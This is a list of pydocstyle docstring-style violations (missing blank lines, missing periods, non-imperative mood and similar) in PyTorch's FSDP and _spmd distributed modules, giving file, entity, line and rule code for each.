- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `forward`, **Line**: 785, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `forward`, **Line**: 785, **Description**: First line should end with a period (not 'c')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `forward`, **Line**: 785, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `summon_full_params`, **Line**: 818, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `summon_full_params`, **Line**: 818, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_deregister_orig_params_ctx`, **Line**: 884, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_deregister_orig_params_ctx`, **Line**: 884, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_deregister_orig_params_ctx`, **Line**: 884, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_apply`, **Line**: 904, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_apply`, **Line**: 904, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: First line should be in imperative mood (perhaps 'Override', not 'Overrides')
- **Error Code**: **D402**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_buffers`, **Line**: 928, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: First line should be in imperative mood (perhaps 'Override', not 'Overrides')
- **Error Code**: **D402**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `named_parameters`, **Line**: 946, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `no_sync`, **Line**: 981, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `no_sync`, **Line**: 981, **Description**: First line should end with a period (not 'P')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `no_sync`, **Line**: 981, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `clip_grad_norm_`, **Line**: 1022, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `clip_grad_norm_`, **Line**: 1022, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_impl`, **Line**: 1187, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_impl`, **Line**: 1187, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_to_load_impl`, **Line**: 1238, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_optim_state_dict_to_load_impl`, **Line**: 1238, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `full_optim_state_dict`, **Line**: 1293, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `full_optim_state_dict`, **Line**: 1293, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `sharded_optim_state_dict`, **Line**: 1358, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `sharded_optim_state_dict`, **Line**: 1358, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `sharded_optim_state_dict`, **Line**: 1358, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `shard_full_optim_state_dict`, **Line**: 1394, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `shard_full_optim_state_dict`, **Line**: 1394, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `flatten_sharded_optim_state_dict`, **Line**: 1466, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `flatten_sharded_optim_state_dict`, **Line**: 1466, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `flatten_sharded_optim_state_dict`, **Line**: 1466, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `scatter_full_optim_state_dict`, **Line**: 1509, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `scatter_full_optim_state_dict`, **Line**: 1509, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `rekey_optim_state_dict`, **Line**: 1591, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `rekey_optim_state_dict`, **Line**: 1591, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict`, **Line**: 1711, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict`, **Line**: 1711, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict`, **Line**: 1711, **Description**: First line should be in imperative mood (perhaps 'Transform', not 'Transforms')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict_to_load`, **Line**: 1804, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `optim_state_dict_to_load`, **Line**: 1804, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `register_comm_hook`, **Line**: 1884, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `register_comm_hook`, **Line**: 1884, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `register_comm_hook`, **Line**: 1884, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_grad_norm`, **Line**: 1942, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_grad_norm`, **Line**: 1942, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_grad_norm`, **Line**: 1942, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_param_to_fqn`, **Line**: 1975, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_param_to_fqn`, **Line**: 1975, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_param_to_fqn`, **Line**: 1975, **Description**: First line should be in imperative mood (perhaps 'Construct', not 'Constructs')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_get_fqn_to_param`, **Line**: 2006, **Description**: First line should be in imperative mood (perhaps 'Construct', not 'Constructs')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/comm_tensor.py`, **Entity**: `CommTensor`, **Line**: 57, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/comm_tensor.py`, **Entity**: `CommTensor`, **Line**: 57, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/experimental_ops.py`, **Entity**: `_refine_sharding`, **Line**: 352, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/experimental_ops.py`, **Entity**: `_refine_sharding`, **Line**: 352, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `get_output`, **Line**: 43, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `get_output`, **Line**: 43, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `find_node`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `find_node`, **Line**: 56, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `is_leaf_subgraph`, **Line**: 67, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `is_leaf_subgraph`, **Line**: 67, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `is_leaf_subgraph`, **Line**: 67, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `clone_subgraph`, **Line**: 87, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `clone_subgraph`, **Line**: 87, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `rebuild_graph`, **Line**: 127, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `rebuild_graph`, **Line**: 127, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `rebuild_graph`, **Line**: 127, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `IterGraph`, **Line**: 24, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `IterGraph`, **Line**: 24, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_subgraph_inputs`, **Line**: 129, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_subgraph_inputs`, **Line**: 129, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_subgraph_inputs`, **Line**: 129, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_inputs_to_subgraph`, **Line**: 221, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_inputs_to_subgraph`, **Line**: 221, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_inputs_to_subgraph`, **Line**: 221, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `move_to_next_iter_before`, **Line**: 277, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `IterGraphModule`, **Line**: 635, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `finalize_setup`, **Line**: 676, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `finalize_setup`, **Line**: 676, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `DSymInt`, **Line**: 48, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `DSymInt`, **Line**: 48, **Description**: First line should end with a period (not 't')
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_is_partial_dtensor`, **Line**: 90, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_is_partial_dtensor`, **Line**: 90, **Description**: First word of the first line should be properly capitalized ('Check', not 'check')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_build_dummy_add_graph`, **Line**: 458, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_build_dummy_add_graph`, **Line**: 458, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_convert_to_distributed`, **Line**: 686, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_convert_to_distributed`, **Line**: 686, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_convert_to_distributed`, **Line**: 686, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `Override`, **Line**: 35, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `replacement`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `replacement`, **Line**: 50, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `transform`, **Line**: 70, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `transform`, **Line**: 70, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `_to_caller_flattened_graph_module`, **Line**: 101, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `_to_caller_flattened_graph_module`, **Line**: 101, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `_to_caller_flattened_graph_module`, **Line**: 101, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `compile`, **Line**: 497, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `compile`, **Line**: 497, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `BatchDimAnalyzer`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `BatchDimAnalyzer`, **Line**: 23, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `init_batch_dim_size`, **Line**: 57, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `init_batch_dim_size`, **Line**: 57, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `init_batch_dim_size`, **Line**: 57, **Description**: First word of the first line should be properly capitalized ('Initialize', not 'initialize')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_batch_dim`, **Line**: 77, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_batch_dim`, **Line**: 77, **Description**: First line should end with a period (not '`')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_batch_dim`, **Line**: 77, **Description**: First word of the first line should be properly capitalized ('Compute', not 'compute')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_act_spec`, **Line**: 171, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_act_spec`, **Line**: 171, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_act_spec`, **Line**: 171, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStyle`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStyle`, **Line**: 44, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `NodeType`, **Line**: 67, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStrategy`, **Line**: 80, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStrategy`, **Line**: 80, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_shard_strategy`, **Line**: 138, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_shard_strategy`, **Line**: 138, **Description**: First line should end with a period (not 'm')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_shard_strategy`, **Line**: 138, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_replicate_strategy`, **Line**: 150, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_replicate_strategy`, **Line**: 150, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_replicate_strategy`, **Line**: 150, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_partial_strategy`, **Line**: 160, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_partial_strategy`, **Line**: 160, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_partial_strategy`, **Line**: 160, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `build_data_parallel_strategies`, **Line**: 183, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `build_data_parallel_strategies`, **Line**: 183, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `build_data_parallel_strategies`, **Line**: 183, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `mark_data_parallel_shardings`, **Line**: 521, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `mark_data_parallel_shardings`, **Line**: 521, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `mark_data_parallel_shardings`, **Line**: 521, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_partition_val`, **Line**: 604, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_partition_val`, **Line**: 604, **Description**: First line should end with a period (not 't')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_partition_val`, **Line**: 604, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partitioner`, **Line**: 632, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partitioner`, **Line**: 632, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partition_data_parallel`, **Line**: 765, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partition_data_parallel`, **Line**: 765, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partition_data_parallel`, **Line**: 765, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `graph_optimization_pass`, **Line**: 66, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `graph_optimization_pass`, **Line**: 66, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `graph_optimization_pass`, **Line**: 66, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_comm_block`, **Line**: 160, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_comm_block`, **Line**: 160, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_scatter_wait_result`, **Line**: 308, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_scatter_wait_result`, **Line**: 308, **Description**: First line should end with a period (not '-')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_fuse_with_cat`, **Line**: 373, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `comm_fusion_with_concat`, **Line**: 476, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `schedule_comm_wait`, **Line**: 510, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `remove_copy_from_optimizer`, **Line**: 551, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_fused_optimizer_block`, **Line**: 744, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_all_fused_optimizer_blocks`, **Line**: 785, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_all_fused_optimizer_blocks`, **Line**: 785, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_split_fused_adam`, **Line**: 801, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_split_fused_adam`, **Line**: 801, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `iter_move_grads_and_optimizers`, **Line**: 951, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `iter_move_grads_and_optimizers`, **Line**: 951, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
